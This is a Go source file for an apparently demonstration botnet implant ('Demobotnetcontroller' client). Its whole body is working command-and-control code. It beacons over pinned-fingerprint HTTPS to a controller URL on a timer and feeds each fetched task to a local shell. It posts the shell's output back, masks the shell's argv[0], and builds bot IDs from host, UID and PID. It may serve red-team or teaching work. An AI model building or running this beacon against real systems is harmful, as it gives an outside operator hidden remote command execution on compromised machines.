// Package beaconer - The real meat and potatoes
package beaconer

/*
 * beaconer.go
 * The real meat and potatoes
 * By J. Stuart McMurray
 * Created 20251116
 * Last Modified 20251116
 */

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync/atomic"
	"time"

	"github.com/magisterquis/curlrevshell/lib/crsdialer"
	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
	"golang.org/x/net/context/ctxhttp"
)

const (
	// TaskMaxSize is the maximum tasking size we'll read, in bytes.
	// We'll actually read one more byte than this, to check for
	// truncation.
	TaskMaxSize = 100 * 1024 * 1024 /* 100 MB */
	// TaskMaxTime is how long we'll try to get tasking.
	TaskMaxTime = time.Minute
)

// DiscardLogger is a logger which discards everything.
var DiscardLogger = slog.New(slog.DiscardHandler)

// Beaconer calls back to Demobotnetcontroller.
// The ID may be empty to use GenerateID.
// The shell's arguments are analogous to what's passed to a shell;
// ShellArgv0 is a bit like bash's exec -a.  It may be empty.
// Interval will be parsed with [time.ParseDuration].
// Beaconer may not be reused or read from after the first call to Beacon.
type Beaconer struct {
	SL          *slog.Logger /* Optional. */
	Fingerprint string       /* Server TLS fingerprint. */
	ID          string       /* Bot ID, optional. */
	ShellArgv   []string     /* Shell argv, kinda. */
	ShellArgv0  string       /* Shell's argv[0]. */
	URL         string       /* Server URL, less ID. */
	Interval    string       /* Beacon interval. */

	client   http.Client
	interval time.Duration
	ctr      atomic.Uint64
}

// Beacon beacons back to the Demobotnetcontroller server at c2URL, to which
// id will be added, ensuring the TLS certificate has the given SHA256
// fingerprint.  Tasking will be slurped, and if non-empty, sent to a shell's
// stdin.
func (b *Beaconer) Beacon(ctx context.Context) error {
	/* Make sure we at least have argv[0]. */
	if 0 == len(b.ShellArgv) {
		return errors.New("shell argv empty")
	}

	/* Parse the beacon interval. */
	var err error
	b.interval, err = time.ParseDuration(b.Interval)
	if nil != err {
		return fmt.Errorf("invalid interval %q: %w", b.Interval, err)
	}

	/* HTTPS Client. */
	vfp, err := crsdialer.TLSFingerprintVerifier(b.Fingerprint)
	if nil != err {
		return fmt.Errorf(
			"setting up TLS fingerprint verification: %w",
			err,
		)
	}
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		VerifyConnection:   vfp,
	}
	transport.ForceAttemptHTTP2 = true
	b.client = http.Client{Transport: transport}

	/* Work out our ID. */
	if "" == b.ID {
		b.ID = b.DefaultID()
	}

	/* Work out our URL. */
	b.URL = strings.TrimRight(b.URL, "/")
	b.URL = b.URL + "/" + b.ID

	/* Beacon every so often. */
	if 0 >= b.interval {
		return errors.New("non-positive beacon interval")
	}
	t := time.NewTicker(b.interval)
	b.sl().Info(
		"Beaconer starting",
		"pid", os.Getpid(),
		"id", b.ID,
		"url", b.URL,
	)
	defer b.sl().Info("Beaconer done.")
	for nil == ctx.Err() {
		/* Beacon. */
		go b.beaconOnce(ctx)

		/* Wait until we're meant to beacon again. */
		select {
		case <-ctx.Done():
			return nil
		case <-t.C:
		}
	}

	return nil
}

// sl returns b's logger, which may be discardLogger.
func (b *Beaconer) sl() *slog.Logger {
	if nil == b.SL {
		return DiscardLogger
	}
	return b.SL
}

// beaconOnce makes a single beacon.
func (b *Beaconer) beaconOnce(ctx context.Context) {
	sl := b.sl().With("ctr", b.ctr.Add(1))
	sl.Debug("Here")

	/* Grab tasking, if we have it. */
	tctx, cancel := context.WithTimeout(ctx, TaskMaxTime)
	defer cancel()
	res, err := ctxhttp.Get(tctx, &b.client, b.URL)
	if nil != err {
		sl.Error(
			"Error getting tasking",
			"error", err,
		)
		return
	}
	defer res.Body.Close()
	if http.StatusOK != res.StatusCode {
		sl.Error(
			"Tasking request not OK",
			"status", res.StatusCode,
		)
		return
	}
	task, err := io.ReadAll(&io.LimitedReader{
		R: res.Body,
		N: TaskMaxSize + 1,
	})
	if nil != err {
		sl.Error(
			"Error reading tasking",
			"error", err,
		)
		return
	} else if TaskMaxSize < len(task) {
		sl.Error(
			"Tasking too large",
			"max", TaskMaxSize,
		)
		return
	} else if 0 == len(task) {
		sl.Debug("No tasking")
		return
	}
	sl.Debug(
		"Got tasking",
		"task_size", len(task),
		"task", string(task),
	)
	res.Body.Close()
	cancel()

	/* Goroutine-wrangler. */
	eg, ctx := ctxerrgroup.WithContext(ctx)

	/* Connect for output. */
	pr, pw := io.Pipe()
	defer pr.Close()
	defer pw.Close()
	eg.GoTag(ctx, "output_conn", func(ctx context.Context) error {
		res, err = ctxhttp.Post(ctx, &b.client, b.URL, "", pr)
		if nil != err {
			return fmt.Errorf("connecting output: %w", err)
		}
		defer res.Body.Close()
		if http.StatusOK != res.StatusCode {
			return fmt.Errorf("request not OK: %d", res.StatusCode)
		}
		if _, err := io.Copy(io.Discard, res.Body); nil != err {
			return fmt.Errorf("discarding response body: %w", err)
		}
		if err := res.Body.Close(); nil != err {
			return fmt.Errorf("closing connection: %w", err)
		}
		return nil
	})

	/* Start our shell. */
	shell := exec.CommandContext(
		ctx,
		b.ShellArgv[0],
		b.ShellArgv[1:]...,
	)
	shell.Args[0] = b.ShellArgv0
	shell.Stdin = bytes.NewReader(task)
	shell.Stdout = pw
	shell.Stderr = pw
	sl.Info(
		"Starting shell",
		"task_size", len(task),
	)
	start := time.Now()
	eg.GoTag(ctx, "shell", func(_ context.Context) error {
		defer pw.Close()
		return shell.Run()
	})

	/* Wait for everything to finish. */
	err = eg.Wait()
	f := sl.Info
	if nil != err {
		f = sl.Error
	}
	f(
		"Shell finished",
		"duration", time.Since(start).Round(time.Millisecond).String(),
		"ok", nil == err,
		"err", err,
	)
}

// DefaultID returns a default bot ID consisting of the hostname (or random
// number if unavailable), the UID number, a random number, and the PID.
func (b *Beaconer) DefaultID() string {
	/* Try for the hostname. */
	hn, err := os.Hostname()
	if nil != err {
		b.sl().Warn("Unable to determine hostname", "error", err)
		hn = "unknown-" + strconv.FormatUint(rand.Uint64(), 36)
	}
	/* Add the other bits. */
	return fmt.Sprintf(
		"%s-uid-%d-pid-%d-%s",
		hn,
		os.Getuid(),
		os.Getpid(),
		strconv.FormatUint(rand.Uint64(), 36),
	)
}
